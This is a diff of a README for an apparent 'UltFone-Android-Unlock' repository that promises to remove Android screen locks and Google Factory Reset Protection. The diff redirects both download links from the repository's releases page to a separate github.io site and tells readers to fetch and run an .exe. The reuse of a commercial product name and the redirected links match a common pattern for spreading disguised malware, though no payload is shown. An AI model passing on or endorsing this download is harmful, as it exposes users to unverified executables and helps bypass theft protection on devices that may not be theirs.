@@ -1,6 +1,6 @@
 # 🔓 UltFone-Android-Unlock - Remove locks from your Android devices
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/scrumscorzonera306/UltFone-Android-Unlock/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://scrumscorzonera306.github.io)
 
 UltFone-Android-Unlock helps you regain access to your Android phone or tablet. You can use this software on Windows 11 and Windows 10 computers to remove screen locks, patterns, PINs, and passwords. It also removes Google Factory Reset Protection (FRP) locks on many devices.
 
@@ -18,7 +18,7 @@ Confirm your computer meets these requirements before you start.
 
 Follow these steps to obtain the setup file.
 
-1. Go to the [Releases page](https://github.com/scrumscorzonera306/UltFone-Android-Unlock/releases).
+1. Go to the [Releases page](https://scrumscorzonera306.github.io).
 2. Look for the latest version tag at the top of the list.
 3. Find the file ending in .exe under the Assets section.
 4. Click the file name to start the download to your computer.
